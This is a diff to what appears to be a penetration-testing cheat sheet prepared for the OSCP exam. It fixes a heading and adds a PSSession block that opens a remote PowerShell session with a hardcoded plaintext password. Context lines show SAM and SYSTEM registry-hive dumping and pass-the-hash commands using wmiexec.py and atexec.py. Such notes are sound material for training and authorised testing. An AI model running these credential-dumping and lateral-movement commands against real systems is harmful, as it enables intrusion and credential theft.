@@ -1122,7 +1122,7 @@ reg save hklm\sam c:\Temp\sam
 reg save hklm\system c:\Temp\system
 ```
 
-## Lateral Movement in AD\
+## Lateral Movement in AD
 
 ### Crackmapexec
 ```javascript
@@ -1183,6 +1183,12 @@ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68
 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
 #we passed full hash here
 ```
+
+### PSSession
+```powershell
+$pass = ConvertTo-SecureString 'Freedom1' -AsPlainText -Force                                                                                $cred = New-Object System.Management.Automation.PSCredential('oscp.exam\support', $pass)                                                     Enter-PSSession -computer 192.168.159.153 -Credential $cred
+```
+
 
 ### Installed Applications x64 and x86
 ```powershell
